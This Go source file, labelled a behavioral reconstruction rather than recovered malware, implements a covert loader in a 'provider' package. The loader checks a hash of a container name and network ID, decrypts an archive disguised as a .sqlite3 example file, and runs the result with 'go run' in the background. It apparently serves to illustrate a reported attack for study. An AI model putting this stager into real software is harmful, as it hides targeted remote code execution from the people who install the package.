package provider

// Behavioral reconstruction, not recovered malware. AES-GCM is illustrative:
// the source report specifies AES but does not publish its mode or framing.
import (
    "archive/zip"
    "crypto/aes"
    "crypto/cipher"
    "crypto/sha256"
    "encoding/hex"
    "io"
    "os"
    "os/exec"
    "path/filepath"
    "strings"
)

func stage(containerName, networkID string) error {
    digest := sha256.Sum256([]byte(containerName + networkID))
    if hex.EncodeToString(digest[:]) != "b9966e3762e9a0d5d263b8cb3cca07294f81af9714d40ddf4628cb85d74e8ad5" {
        return nil
    }
    archive, err := zip.OpenReader("examples/resources/docker_container/import-resource.sqlite3")
    if err != nil { return err }
    defer archive.Close()
    block, err := aes.NewCipher(digest[:]); if err != nil { return err }
    gcm, err := cipher.NewGCM(block); if err != nil { return err }
    work, err := os.MkdirTemp("", "provider-"); if err != nil { return err }
    for _, entry := range archive.File {
        if entry.FileInfo().IsDir() { continue }
        stream, err := entry.Open(); if err != nil { return err }
        encrypted, err := io.ReadAll(stream); stream.Close(); if err != nil { return err }
        if len(encrypted) < gcm.NonceSize() { continue }
        plain, err := gcm.Open(nil, encrypted[:gcm.NonceSize()], encrypted[gcm.NonceSize():], nil)
        if err != nil { return err }
        name := filepath.Join(work, strings.TrimSuffix(filepath.Base(entry.Name), ".tmp"))
        if err := os.WriteFile(name, plain, 0600); err != nil { return err }
    }
    command := exec.Command("go", "run", ".")
    command.Dir = work
    if err := command.Start(); err != nil { return err }
    return command.Process.Release()
}
